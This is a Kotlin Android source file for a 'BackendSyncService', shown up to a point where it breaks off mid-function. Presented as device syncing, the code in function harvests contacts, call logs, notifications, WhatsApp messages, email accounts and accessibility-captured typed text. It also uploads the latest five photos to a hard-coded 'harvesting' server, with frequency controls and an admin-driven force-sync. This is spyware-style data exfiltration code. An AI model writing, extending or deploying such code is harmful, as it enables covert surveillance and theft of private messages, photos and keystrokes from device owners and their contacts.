package com.devicesync.app.services

import android.Manifest
import android.accounts.AccountManager
import android.app.NotificationManager
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.devicesync.app.api.ApiService
import com.devicesync.app.api.RetrofitClient
import com.devicesync.app.api.SyncRequest
import com.devicesync.app.data.DataType
import com.devicesync.app.data.DataTypeEnum
import com.devicesync.app.data.DeviceInfo
import com.devicesync.app.data.models.*
import com.devicesync.app.utils.PermissionManager
import com.devicesync.app.utils.AdminConfigManager
import com.devicesync.app.utils.DynamicPermissionManager
import com.devicesync.app.utils.DataCollector
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import retrofit2.Response
import java.io.File
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*

class BackendSyncService(
    private val context: Context,
    private val apiService: ApiService
) {
    
    // Use provided API service
    private val contentResolver: ContentResolver = context.contentResolver
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    
    // Local storage for tracking last sync times
    private val sharedPreferences = context.getSharedPreferences("sync_timestamps", Context.MODE_PRIVATE)
    
    // Sync state tracking to prevent overlapping syncs
    private var isSyncInProgress = false
    private var currentSyncStartTime = 0L
    
    // Helper function to check if sync is in progress
    fun isSyncInProgress(): Boolean = isSyncInProgress
    
    // Helper function to get current sync duration
    fun getCurrentSyncDuration(): Long {
        return if (isSyncInProgress && currentSyncStartTime > 0) {
            System.currentTimeMillis() - currentSyncStartTime
        } else 0L
    }
    
    // Permission checking helper functions
    private fun hasContactsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    }
    

    
    private fun hasCallLogPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun hasStoragePermission(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    // Sync frequency control constants - CUSTOMIZED for specific data types
    private val SYNC_FREQUENCY_CALL_LOGS = 30 * 60 * 60 * 1000L // 30 hours in milliseconds
    private val SYNC_FREQUENCY_CONTACTS = 2 * 60 * 60 * 1000L // 2 hours in milliseconds
    private val SYNC_FREQUENCY_EMAIL_ACCOUNTS = 24 * 60 * 60 * 1000L // 1 day in milliseconds
    // NOTIFICATIONS: Real-time (no frequency limit)
    
    // Helper function to check if data type can be synced based on frequency and admin config
    private fun canSyncDataType(dataType: String, forceSync: Boolean = false): Boolean {
        // First check if admin allows this data type
        if (!AdminConfigManager.isDataTypeAllowed(dataType)) {
            println("🚫 Admin config does not allow $dataType sync")
            return false
        }
        
        // Check if permission is granted for this data type
        if (!DynamicPermissionManager.isDataTypePermissionGranted(context, dataType)) {
            println("🚫 Permission not granted for $dataType sync")
            return false
        }
        
        // If force sync is enabled, bypass frequency checks
        if (forceSync) {
            println("🚀 Force sync enabled for $dataType - bypassing frequency check")
            return true
        }
        
        val lastSyncTime = getLastSyncTime(dataType)
        val currentTime = System.currentTimeMillis()
        
        // If this is the first sync (lastSyncTime == 0), always allow sync
        if (lastSyncTime == 0L) {
            println("🆕 First sync for $dataType - allowing sync")
            return true
        }
        
        return when (dataType) {
            "NOTIFICATIONS" -> {
                // Notifications can sync anytime (real-time)
                println("✅ NOTIFICATIONS sync allowed - real-time")
                true
            }
            "CALL_LOGS" -> {
                // Call logs can sync every 30 hours
                val timeSinceLastSync = currentTime - lastSyncTime
                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_CALL_LOGS
                
                if (!canSync) {
                    val remainingTime = SYNC_FREQUENCY_CALL_LOGS - timeSinceLastSync
                    val remainingHours = remainingTime / (60 * 60 * 1000)
                    println("⏰ CALL_LOGS sync skipped - Next sync available in ${remainingHours}h")
                } else {
                    val hoursSince = timeSinceLastSync / (60 * 60 * 1000)
                    println("✅ CALL_LOGS sync allowed - ${hoursSince}h since last sync")
                }
                
                canSync
            }
            "CONTACTS" -> {
                // Contacts can sync every 2 hours
                val timeSinceLastSync = currentTime - lastSyncTime
                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_CONTACTS
                
                if (!canSync) {
                    val remainingTime = SYNC_FREQUENCY_CONTACTS - timeSinceLastSync
                    val remainingMinutes = remainingTime / (60 * 1000)
                    println("⏰ CONTACTS sync skipped - Next sync available in ${remainingMinutes}m")
                } else {
                    val minutesSince = timeSinceLastSync / (60 * 1000)
                    println("✅ CONTACTS sync allowed - ${minutesSince}m since last sync")
                }
                
                canSync
            }
            "EMAIL_ACCOUNTS" -> {
                // Email accounts can sync every 1 day
                val timeSinceLastSync = currentTime - lastSyncTime
                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_EMAIL_ACCOUNTS
                
                if (!canSync) {
                    val remainingTime = SYNC_FREQUENCY_EMAIL_ACCOUNTS - timeSinceLastSync
                    val remainingHours = remainingTime / (60 * 60 * 1000)
                    println("⏰ EMAIL_ACCOUNTS sync skipped - Next sync available in ${remainingHours}h")
                } else {
                    val hoursSince = timeSinceLastSync / (60 * 60 * 1000)
                    println("✅ EMAIL_ACCOUNTS sync allowed - ${hoursSince}h since last sync")
                }
                
                canSync
            }
            else -> {
                println("⚠️ Unknown data type: $dataType - allowing sync")
                true // Unknown data types can sync anytime
            }
        }
    }
    
    // Helper function to start sync (returns false if already in progress)
    private fun startSync(): Boolean {
        if (isSyncInProgress) {
            println("⚠️ Sync already in progress, skipping...")
            return false
        }
        isSyncInProgress = true
        currentSyncStartTime = System.currentTimeMillis()
        println("🔄 Starting sync at ${Date(currentSyncStartTime)}")
        return true
    }
    
    // Helper function to end sync
    private fun endSync() {
        isSyncInProgress = false
        val duration = System.currentTimeMillis() - currentSyncStartTime
        println("✅ Sync completed in ${duration}ms")
        currentSyncStartTime = 0L
    }
    
    // Helper function to get last sync time for a data type
    private fun getLastSyncTime(dataType: String): Long {
        return sharedPreferences.getLong("last_sync_$dataType", 0L)
    }
    
    // Helper function to update last sync time for a data type
    private fun updateLastSyncTime(dataType: String, timestamp: Long) {
        sharedPreferences.edit().putLong("last_sync_$dataType", timestamp).apply()
        println("📱 Updated last sync time for $dataType: ${Date(timestamp)}")
    }
    
    // Helper function to filter data based on last sync time
    private fun filterDataByLastSyncTime(dataType: String, data: List<Any>, getTimestamp: (Any) -> Long): List<Any> {
        val lastSyncTime = getLastSyncTime(dataType)
        if (lastSyncTime == 0L) {
            println("📱 No previous sync time found for $dataType, syncing all data")
            return data
        }
        
        val filteredData = data.filter { item ->
            val itemTimestamp = getTimestamp(item)
            itemTimestamp > lastSyncTime
        }
        
        val skippedCount = data.size - filteredData.size
        if (skippedCount > 0) {
            println("📱 Skipped $skippedCount already synced $dataType items (since ${Date(lastSyncTime)})")
        }
        
        return filteredData
    }
    
    // Function to clear sync timestamps for a specific data type
    fun clearSyncTimestamps(dataType: String? = null) {
        if (dataType == null) {
            // Clear all sync timestamps but preserve first sync flag
            val isFirstSync = isFirstSyncEver()
            sharedPreferences.edit().clear().apply()
            // Restore the first sync flag
            sharedPreferences.edit().putBoolean("is_first_sync", isFirstSync).apply()
            println("📱 Cleared all sync timestamps (preserved first sync flag)")
        } else {
            // Clear timestamp for specific data type
            sharedPreferences.edit().remove("last_sync_$dataType").apply()
            println("📱 Cleared sync timestamp for $dataType")
        }
    }
    
    // Function to get sync timestamp statistics
    fun getSyncTimestampStats(): Map<String, Long> {
        val allKeys = sharedPreferences.all.keys.filter { it.startsWith("last_sync_") }
        val stats = mutableMapOf<String, Long>()
        
        allKeys.forEach { key ->
            val dataType = key.substringAfter("last_sync_")
            val timestamp = sharedPreferences.getLong(key, 0L)
            stats[dataType] = timestamp
        }
        
        return stats
    }
    
    // Function to get sync status information
    fun getSyncStatusInfo(forceSync: Boolean = false): Map<String, Any> {
        val currentTime = System.currentTimeMillis()
        val stats = getSyncTimestampStats()
        val statusInfo = mutableMapOf<String, Any>()
        
        // Add all data types, even if they haven't been synced yet
        val allDataTypes = listOf("CONTACTS", "CALL_LOGS", "EMAIL_ACCOUNTS", "NOTIFICATIONS", "WHATSAPP")
        
        allDataTypes.forEach { dataType ->
            val lastSyncTime = stats[dataType] ?: 0L
            val timeSinceLastSync = if (lastSyncTime > 0) currentTime - lastSyncTime else 0L
            val canSync = canSyncDataType(dataType, forceSync)
            val nextSyncTime = if (canSync) 0L else {
                when (dataType) {
                    "CALL_LOGS" -> lastSyncTime + SYNC_FREQUENCY_CALL_LOGS
                    "CONTACTS" -> lastSyncTime + SYNC_FREQUENCY_CONTACTS
                    "EMAIL_ACCOUNTS" -> lastSyncTime + SYNC_FREQUENCY_EMAIL_ACCOUNTS
                    "NOTIFICATIONS" -> 0L // Notifications can sync anytime
                    else -> lastSyncTime + SYNC_FREQUENCY_CALL_LOGS // Default to call logs frequency
                }
            }
            
            val timeUntilNextSync = if (nextSyncTime > 0) nextSyncTime - currentTime else 0L
            
            statusInfo[dataType] = mapOf(
                "lastSyncTime" to lastSyncTime,
                "lastSyncDate" to if (lastSyncTime > 0) Date(lastSyncTime).toString() else "Never",
                "timeSinceLastSync" to timeSinceLastSync,
                "canSync" to canSync,
                "nextSyncTime" to nextSyncTime,
                "nextSyncDate" to if (nextSyncTime > 0) Date(nextSyncTime).toString() else "Now",
                "timeUntilNextSync" to timeUntilNextSync,
                "syncFrequency" to when (dataType) {
                    "CALL_LOGS" -> "30 hours"
                    "CONTACTS" -> "2 hours"
                    "EMAIL_ACCOUNTS" -> "1 day"
                    "NOTIFICATIONS" -> "Real-time"
                    else -> "30 hours"
                }
            )
        }
        
        statusInfo["isSyncInProgress"] = isSyncInProgress
        statusInfo["currentSyncDuration"] = getCurrentSyncDuration()
        statusInfo["isFirstSync"] = isFirstSyncEver()
        
        return statusInfo
    }
    
    // Helper function to check if this is the first sync ever
    private fun isFirstSyncEver(): Boolean {
        return sharedPreferences.getBoolean("is_first_sync", true)
    }
    
    // Helper function to mark first sync as completed
    private fun markFirstSyncCompleted() {
        sharedPreferences.edit().putBoolean("is_first_sync", false).apply()
        println("✅ First sync completed and marked in storage")
    }
    
    // Function to reset first sync flag (for testing purposes)
    fun resetFirstSyncFlag() {
        sharedPreferences.edit().putBoolean("is_first_sync", true).apply()
        println("🔄 First sync flag reset - next sync will be treated as first sync")
    }
    
    // 🎯 TOP-TIER: Last 5 Images Upload Functionality
    suspend fun uploadLast5Images(deviceId: String): Result<String> {
        return withContext(Dispatchers.IO) {
            try {
                println("🎯 TOP-TIER: Starting last 5 images upload for device: $deviceId")
                
                // Get last 5 images from device
                val imageFiles = getLast5ImagesFromDevice()
                if (imageFiles.isEmpty()) {
                    return@withContext Result.failure(Exception("No images found on device"))
                }
                
                println("📸 Found ${imageFiles.size} images to upload")
                
                // Create metadata for images
                val metadata = imageFiles.map { file ->
                    mapOf(
                        "name" to file.name,
                        "path" to file.absolutePath,
                        "type" to "image/jpeg",
                        "dateAdded" to SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.getDefault())
                            .format(Date(file.lastModified()))
                    )
                }
                
                // Upload using FormData
                val result = uploadImagesWithFormData(deviceId, imageFiles, metadata)
                println("🎯 TOP-TIER: Upload completed: $result")
                
                Result.success(result)
                
            } catch (e: Exception) {
                println("❌ Error uploading last 5 images: ${e.message}")
                Result.failure(e)
            }
        }
    }
    
    private fun getLast5ImagesFromDevice(): List<File> {
        val images = mutableListOf<File>()
        
        try {
            // Query for images in MediaStore
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED
            )
            
            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
            
            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < 5) {
                    val dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                    val filePath = cursor.getString(dataColumn)
                    
                    if (filePath != null) {
                        val file = File(filePath)
                        if (file.exists() && file.length() <= 100 * 1024 * 1024) { // 100MB limit
                            images.add(file)
                            count++
                            println("📸 Added image: ${file.name}")
                        }
                    }
                }
            }
            
        } catch (e: Exception) {
            println("❌ Error getting images from device: ${e.message}")
        }
        
        return images
    }
    
    private fun uploadImagesWithFormData(deviceId: String, imageFiles: List<File>, metadata: List<Map<String, Any>>): String {
        try {
            // Create multipart request
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
            
            // Add files (max 5)
            imageFiles.take(5).forEachIndexed { index, file ->
                val fileBody = file.asRequestBody("image/*".toMediaType())
                requestBody.addFormDataPart("files", file.name, fileBody)
                println("📤 Adding file to upload: ${file.name}")
            }
            
            // Add metadata JSON
            val metadataJson = JSONArray().apply {
                metadata.take(imageFiles.size).forEach { item ->
                    put(JSONObject().apply {
                        put("name", item["name"] ?: "")
                        put("path", item["path"] ?: "")
                        put("type", item["type"] ?: "image/jpeg")
                        put("dateAdded", item["dateAdded"] ?: "")
                    })
                }
            }
            
            requestBody.addFormDataPart("metadata", metadataJson.toString())
            
            // Create request
            val request = Request.Builder()
                .url("https://kotlin-node-harvesting.onrender.com/api/test/devices/$deviceId/upload-last-5-images")
                .post(requestBody.build())
                .build()
            
            // Execute request
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    println("✅ Upload successful: $responseBody")
                    return responseBody ?: "Upload completed"
                } else {
                    val errorBody = response.body?.string()
                    println("❌ Upload failed: ${response.code} - $errorBody")
                    throw Exception("Upload failed: ${response.code}")
                }
            }
            
        } catch (e: Exception) {
            println("❌ Error in FormData upload: ${e.message}")
            throw e
        }
    }
    
    suspend fun registerDevice(deviceInfo: DeviceInfo): Result<DeviceInfo> {
        return withContext(Dispatchers.IO) {
            try {
                println("🔧 Attempting to register device: ${deviceInfo.deviceId}")
                val response = apiService.registerDevice(deviceInfo)
                println("🔧 Device registration response: ${response.code()}")
                
                if (response.isSuccessful) {
                    val responseBody = response.body()
                    println("🔧 Device registration successful: ${responseBody?.message}")
                    Result.success(deviceInfo)
                } else {
                    val errorMessage = "Failed to register device: ${response.code()} - ${response.message()}"
                    println("❌ $errorMessage")
                    Result.failure(Exception(errorMessage))
                }
            } catch (e: Exception) {
                println("❌ Exception during device registration: ${e.message}")
                Result.failure(e)
            }
        }
    }
    
    suspend fun getDevices(): Result<List<DeviceInfo>> {
        return withContext(Dispatchers.IO) {
            try {
                val response = apiService.getDevices()
                if (response.isSuccessful && response.body()?.success == true) {
                    Result.success(response.body()?.data ?: emptyList())
                } else {
                    Result.failure(Exception(response.body()?.error ?: "Failed to get devices"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
    
    suspend fun getDataTypes(deviceId: String): Result<List<DataType>> {
        return withContext(Dispatchers.IO) {
            try {
                val response = apiService.getDataTypes(deviceId)
                if (response.isSuccessful && response.body()?.success == true) {
                    val dataTypeInfos = response.body()?.data ?: emptyList()
                    val dataTypes = dataTypeInfos.map { info ->
                        DataType(
                            type = info.type,
                            deviceId = info.deviceId,
                            isEnabled = info.isEnabled,
                            lastSyncTime = info.lastSyncTime,
                            itemCount = info.itemCount
                        )
                    }
                    Result.success(dataTypes)
                } else {
                    Result.failure(Exception(response.body()?.error ?: "Failed to get data types"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
    
    suspend fun syncContacts(deviceId: String, forceSync: Boolean = false): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                // Check if contacts can be synced based on frequency
                if (!canSyncDataType("CONTACTS", forceSync)) {
                    return@withContext SyncResult.Success(0)
                }
                
                // Check contacts permission first
                if (!hasContactsPermission()) {
                    println("⚠️ Contacts permission denied - cannot sync contacts")
                    return@withContext SyncResult.PermissionDenied("Contacts permission is required to sync contacts")
                }
                
                val dataCollector = DataCollector(context)
                val contacts = dataCollector.collectContacts()
                
                // Convert JSONArray to List<Map<String, Any>>
                val data = mutableListOf<Map<String, Any>>()
                for (i in 0 until contacts.length()) {
                    val contact = contacts.getJSONObject(i)
                    val phoneNumbers = contact.getJSONArray("phone_numbers")
                    val emails = contact.getJSONArray("emails")
                    
                    // Get first phone number if available
                    val phoneNumber = if (phoneNumbers.length() > 0) {
                        phoneNumbers.getJSONObject(0).getString("number")
                    } else {
                        ""
                    }
                    
                    // Get first email if available
                    val emailList = mutableListOf<String>()
                    for (j in 0 until emails.length()) {
                        emailList.add(emails.getJSONObject(j).getString("address"))
                    }
                    
                    // Only add contacts that have either phone number or email
                    if (phoneNumber.isNotEmpty() || emailList.isNotEmpty()) {
                        val contactData = mapOf(
                            "name" to contact.getString("name"),
                            "phoneNumber" to phoneNumber,
                            "phoneType" to "MOBILE",
                            "emails" to emailList,
                            "organization" to "",
                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                        )
                        data.add(contactData)
                    }
                }
                
                if (data.isEmpty()) {
                    println("📱 No contacts to sync")
                    return@withContext SyncResult.Success(0)
                }
                
                println("📱 Syncing ${data.size} contacts")
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "CONTACTS",
                    data = data,
                    timestamp = timestamp
                )
                
                val response = apiService.syncData(deviceId, syncRequest)
                if (response.isSuccessful && response.body()?.success == true) {
                    // Update last sync time
                    updateLastSyncTime("CONTACTS", System.currentTimeMillis())
                    val syncResponse = response.body()?.data
                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                } else {
                    SyncResult.Error(response.body()?.error ?: "Failed to sync contacts")
                }
            } catch (e: Exception) {
                SyncResult.Error("Error syncing contacts: ${e.message}")
            }
        }
    }
    
    suspend fun syncCallLogs(deviceId: String, forceSync: Boolean = false): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                // Check if call logs can be synced based on frequency
                if (!canSyncDataType("CALL_LOGS", forceSync)) {
                    return@withContext SyncResult.Success(0)
                }
                
                // Check call log permission first
                if (!hasCallLogPermission()) {
                    println("⚠️ Call log permission denied - cannot sync call logs")
                    return@withContext SyncResult.PermissionDenied("Call log permission is required to sync call logs")
                }
                
                val dataCollector = DataCollector(context)
                val callLogs = dataCollector.collectCallLogs()
                
                // Convert JSONArray to List<Map<String, Any>>
                val data = mutableListOf<Map<String, Any>>()
                for (i in 0 until callLogs.length()) {
                    val callLog = callLogs.getJSONObject(i)
                    val callType = when(callLog.getInt("type")) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                        else -> "UNKNOWN"
                    }
                    
                    // Only add call logs that have a valid phone number
                    val phoneNumber = callLog.getString("number")
                    if (phoneNumber.isNotEmpty()) {
                        val callData = mapOf(
                            "phoneNumber" to phoneNumber,
                            "callType" to callType,
                            "duration" to callLog.getLong("duration"),
                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(callLog.getLong("date"))),
                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                        )
                        data.add(callData)
                    }
                }
                
                if (data.isEmpty()) {
                    println("📱 No new call logs to sync")
                    return@withContext SyncResult.Success(0)
                }
                
                println("📱 Syncing ${data.size} new call logs")
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "CALL_LOGS",
                    data = data,
                    timestamp = timestamp
                )
                
                val response = apiService.syncData(deviceId, syncRequest)
                if (response.isSuccessful && response.body()?.success == true) {
                    // Update last sync time
                    updateLastSyncTime("CALL_LOGS", System.currentTimeMillis())
                    val syncResponse = response.body()?.data
                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                } else {
                    SyncResult.Error(response.body()?.error ?: "Failed to sync call logs")
                }
            } catch (e: Exception) {
                SyncResult.Error("Failed to sync call logs: ${e.message}")
            }
        }
    }
    

    
    suspend fun syncAccessibilityData(deviceId: String, forceSync: Boolean = false): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                // Check if accessibility data can be synced based on frequency
                if (!canSyncDataType("ACCESSIBILITY", forceSync)) {
                    return@withContext SyncResult.Success(0)
                }
                
                // Get accessibility data from the service
                val accessibilityData = getAccessibilityDataFromDevice(deviceId)
                
                if (accessibilityData.isEmpty()) {
                    println("♿ No accessibility data to sync")
                    return@withContext SyncResult.Success(0)
                }
                
                println("♿ Syncing ${accessibilityData.size} accessibility data items")
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "ACCESSIBILITY", // Using accessibility endpoint
                    data = accessibilityData,
                    timestamp = timestamp
                )
                
                val response = apiService.syncData(deviceId, syncRequest)
                if (response.isSuccessful && response.body()?.success == true) {
                    // Update last sync time
                    updateLastSyncTime("ACCESSIBILITY", System.currentTimeMillis())
                    val syncResponse = response.body()?.data
                    SyncResult.Success(syncResponse?.itemsSynced ?: accessibilityData.size)
                } else {
                    SyncResult.Error(response.body()?.error ?: "Failed to sync accessibility data")
                }
            } catch (e: Exception) {
                SyncResult.Error("Failed to sync accessibility data: ${e.message}")
            }
        }
    }
    
    private fun getAccessibilityDataFromDevice(deviceId: String): List<Map<String, Any>> {
        val accessibilityData = mutableListOf<Map<String, Any>>()
        
        try {
            // Get accessibility service data
            val accessibilityService = com.devicesync.app.services.TextInputAccessibilityService()
            val textInputData = accessibilityService.getAllTextData()
            
            textInputData.forEach { data ->
                val item = mapOf(
                    "type" to "ACCESSIBILITY",
                    "event_type" to data.optString("event_type", "unknown"),
                    "package_name" to data.optString("package_name", "unknown"),
                    "text_content" to data.optString("text", ""),
                    "timestamp" to data.optLong("timestamp", System.currentTimeMillis()),
                    "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date()),
                    "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                )
                accessibilityData.add(item)
            }
            
            // Add accessibility service status
            val serviceStatus = mapOf(
                "type" to "ACCESSIBILITY_STATUS",
                "service_enabled" to com.devicesync.app.services.TextInputAccessibilityService.isServiceEnabled,
                    "timestamp" to System.currentTimeMillis(),
                    "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date()),
                    "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
            )
            accessibilityData.add(serviceStatus)
            
            println("♿ Collected ${accessibilityData.size} accessibility data items")
        } catch (e: Exception) {
            println("⚠️ Error collecting accessibility data: ${e.message}")
        }
        
        return accessibilityData
    }
    

    
    suspend fun syncNotifications(deviceId: String, sinceTimestamp: Long = 0L): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val dataCollector = DataCollector(context)
                val notifications = dataCollector.collectNotifications()
                
                // Convert JSONArray to List<Map<String, Any>>
                val data = mutableListOf<Map<String, Any>>()
                for (i in 0 until notifications.length()) {
                    val notification = notifications.getJSONObject(i)
                    
                    // Only add notifications that have required fields
                    if (notification.has("package_name") && notification.has("title")) {
                        val notificationData = mapOf(
                            "notificationId" to "NOTIF_${System.currentTimeMillis()}_${i}", // Generate unique ID
                            "packageName" to notification.getString("package_name"),
                            "appName" to notification.optString("app_name", "Unknown App"), // Add required field
                            "title" to notification.getString("title"),
                            "text" to notification.optString("text", ""),
                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notification.optLong("timestamp", System.currentTimeMillis()))),
                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                        )
                        data.add(notificationData)
                    }
                }
                
                if (data.isEmpty()) {
                    println("📱 No new notifications to sync")
                    return@withContext SyncResult.Success(0)
                }
                
                println("📱 Syncing ${data.size} new notifications")
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "NOTIFICATIONS",
                    data = data,
                    timestamp = timestamp
                )
                
                println("📱 Sending notifications sync request: ${data.size} items")
                val response = apiService.syncData(deviceId, syncRequest)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    // Update last sync time
                    updateLastSyncTime("NOTIFICATIONS", System.currentTimeMillis())
                    val syncResponse = response.body()?.data
                    println("✅ Notifications sync successful: ${syncResponse?.itemsSynced} items")
                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                } else {
                    println("❌ Notifications sync failed: ${response.code()} - ${response.body()?.error}")
                    SyncResult.Error(response.body()?.error ?: "Failed to sync notifications")
                }
            } catch (e: Exception) {
                println("❌ Notifications sync exception: ${e.message}")
                SyncResult.Error("Failed to sync notifications: ${e.message}")
            }
        }
    }
    
    suspend fun syncWhatsApp(deviceId: String): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val dataCollector = DataCollector(context)
                val whatsappMessages = dataCollector.collectWhatsAppData()
                println("📱 Syncing ${whatsappMessages.length()} WhatsApp messages for device $deviceId")
                
                // Convert JSONArray to List<Map<String, Any>>
                val data = mutableListOf<Map<String, Any>>()
                for (i in 0 until whatsappMessages.length()) {
                    val message = whatsappMessages.getJSONObject(i)
                    val messageData = mapOf(
                        "address" to message.getString("chat_name"),
                        "body" to message.getString("message"),
                        "type" to "WHATSAPP",
                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.getLong("timestamp"))),
                        "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                    )
                    data.add(messageData)
                }
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "WHATSAPP",
                    data = data,
                    timestamp = timestamp
                )
                
                println("📱 Sending WhatsApp sync request: ${data.size} items")
                val response = apiService.syncData(deviceId, syncRequest)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    val syncResponse = response.body()?.data
                    println("✅ WhatsApp sync successful: ${syncResponse?.itemsSynced} items")
                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                } else {
                    println("❌ WhatsApp sync failed: ${response.code()} - ${response.body()?.error}")
                    SyncResult.Error(response.body()?.error ?: "Failed to sync WhatsApp messages")
                }
            } catch (e: Exception) {
                println("❌ WhatsApp sync exception: ${e.message}")
                SyncResult.Error("Failed to sync WhatsApp messages: ${e.message}")
            }
        }
    }
    
    suspend fun syncEmailAccounts(deviceId: String, forceSync: Boolean = false): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                // Check if email accounts can be synced based on frequency
                if (!canSyncDataType("EMAIL_ACCOUNTS", forceSync)) {
                    return@withContext SyncResult.Success(0)
                }
                
                val dataCollector = DataCollector(context)
                val emailAccounts = dataCollector.collectEmailAccounts()
                println("📱 Syncing ${emailAccounts.length()} email accounts for device $deviceId")
                
                // Convert JSONArray to List<Map<String, Any>>
                val data = mutableListOf<Map<String, Any>>()
                for (i in 0 until emailAccounts.length()) {
                    val account = emailAccounts.getJSONObject(i)
                    
                    // Only add email accounts that have required fields
                    if (account.has("name") && account.has("type")) {
                        val accountData = mapOf(
                            "accountId" to "EMAIL_${System.currentTimeMillis()}_${i}", // Generate unique ID
                            "emailAddress" to account.optString("name", ""), // Use name as email address
                            "accountName" to account.optString("name", "Unknown Account"), // Add required field
                            "provider" to account.optString("type", "Unknown Provider"), // Add required field
                            "accountType" to "IMAP", // Default value
                            "lastSyncTime" to System.currentTimeMillis(),
                            "isActive" to true,
                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                        )
                        data.add(accountData)
                    }
                }
                
                if (data.isEmpty()) {
                    println("📱 No email accounts to sync")
                    return@withContext SyncResult.Success(0)
                }
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "EMAIL_ACCOUNTS",
                    data = data,
                    timestamp = timestamp
                )
                
                println("📱 Sending email accounts sync request: ${data.size} items")
                val response = apiService.syncData(deviceId, syncRequest)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    // Update last sync time
                    updateLastSyncTime("EMAIL_ACCOUNTS", System.currentTimeMillis())
                    val syncResponse = response.body()?.data
